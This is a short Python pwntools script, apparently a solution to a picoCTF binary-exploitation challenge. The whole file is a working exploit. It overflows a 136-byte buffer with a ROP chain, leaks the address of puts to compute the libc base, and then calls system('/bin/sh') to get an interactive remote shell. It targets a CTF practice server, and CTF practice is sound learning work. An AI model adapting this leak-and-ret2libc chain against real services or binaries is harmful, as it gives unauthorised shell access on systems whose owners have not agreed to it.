from pwn import *

LOCAL = False
HOST = "mercury.picoctf.net"
PORT = 37289
elf = context.binary = ELF("./vuln_patched")
libc = ELF("./libc.so.6", checksec=False)

if LOCAL:
    io = process("./vuln_patched")
else:
    io = remote(HOST, PORT)

pop_rdi = 0x400913
ret = 0x40052e

# Leak libc
io.recv()
io.sendline(flat(
    b'a'*136, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.entrypoint 
)); io.recvline(); io.recvline()

leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
info("Libc base address: " + hex(libc.address))

# ret2lic
io.sendline(flat(
    b'a'*136, pop_rdi, next(libc.search(b'/bin/sh\x00')), ret, libc.sym['system']
))

io.interactive()